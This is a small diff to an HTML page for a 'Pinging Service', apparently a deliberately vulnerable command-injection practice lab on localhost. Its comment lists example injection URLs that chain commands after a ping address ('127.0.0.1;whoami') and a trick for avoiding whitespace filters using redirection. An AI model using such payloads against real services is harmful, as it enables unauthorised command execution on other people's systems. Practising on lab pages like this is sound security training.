@@ -1,7 +1,7 @@
 <html>
 <!-- http://localhost:8000/command_injection.php?input=127.0.0.1
-http://localhost:8000/command_injection.php?input=127.0.0.1;whoami;
-http://localhost:8000/command_injection.php?input=127.0.0.1;ls>tmp.txt;cat<tmp.txt -->
+http://localhost:8000/command_injection.php?input=127.0.0.1;whoami
+Bypass white spaces: http://localhost:8000/command_injection.php?input=127.0.0.1;ls>tmp.txt;cat<tmp.txt -->
 
 <h1> Pinging Service </h1>
 
